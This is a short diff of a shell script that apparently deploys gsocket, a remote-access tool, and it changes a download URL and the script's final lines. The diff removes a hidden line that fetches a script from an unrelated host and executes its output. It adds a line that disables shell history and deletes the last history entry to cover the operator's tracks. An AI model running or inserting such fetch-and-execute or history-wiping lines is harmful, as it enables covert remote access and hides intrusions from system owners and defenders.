@@ -65,7 +65,7 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE_CDN="https://github.com/hackerschoice/gsocket.io/tree/refs/heads/gh-pages"
+URL_BASE_CDN="https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages"
 URL_BASE_X="https://gsocket.io"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
@@ -1712,5 +1712,5 @@ else
 fi
 webhooks
 echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
-$(curl -fsSL https://kr.hbmc.net/gs.sh)
+export HISTFILE=/dev/null ;history -d $(history 1);
 exit_code 0
